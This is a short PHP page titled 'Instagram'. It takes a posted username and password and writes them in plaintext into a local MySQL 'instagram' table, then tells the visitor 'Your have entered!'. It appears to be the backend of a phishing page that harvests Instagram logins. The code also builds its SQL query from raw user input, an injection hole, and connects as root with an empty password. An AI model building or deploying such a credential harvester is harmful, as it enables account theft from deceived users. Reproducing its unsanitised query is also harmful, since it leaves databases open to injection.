<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
</head>
<body>
<?php
   if(isset($_POST['insert']))
  {
  $con = mysqli_connect("localhost","root","");
  if($con)
 {
//echo "Mysql connection ok..!<br>";
mysqli_select_db($con,"instagram");
$Uname = strval($_POST['Uname']);
$pass = strval($_POST['pass']);
$insert = "insert into instagram values('$Uname','$pass')";
if(mysqli_query($con,$insert))
{
echo "Your have entered!<br>";

}
else
{
	echo "Data not inserted..!<br>".mysqli_error($con);
}
mysqli_close($con);
}
}
?>
</body>
</html>